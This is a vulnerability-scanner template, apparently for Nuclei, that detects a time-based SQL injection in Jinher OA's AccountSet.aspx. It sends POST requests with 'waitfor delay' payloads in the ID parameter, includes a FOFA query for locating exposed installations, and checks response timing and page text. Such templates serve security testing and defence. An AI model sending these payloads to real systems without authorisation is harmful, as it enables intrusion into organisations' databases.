id: poc-yaml-jinher-jhsoft-accountset-aspx-sqli
info:
  name: "Jinher OA AccountSet.aspx SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA
  metadata:
    finger: Jinher OA
    fofa: app="金和网络-金和OA"

http:
  - raw:
      - |
        POST /c6/JHSoft.Web.CostControl/subClass/AccountSet.aspx/?ID=1;waitfor+delay%270:0:5%27--&OperType=Edit HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

      - |
        POST /c6/JHSoft.Web.CostControl/subClass/AccountSet.aspx/?ID=1;waitfor+delay%270:0:8%27--&OperType=Edit HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "帐套设置"
          - "系统编码"
          - "帐套状态"
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
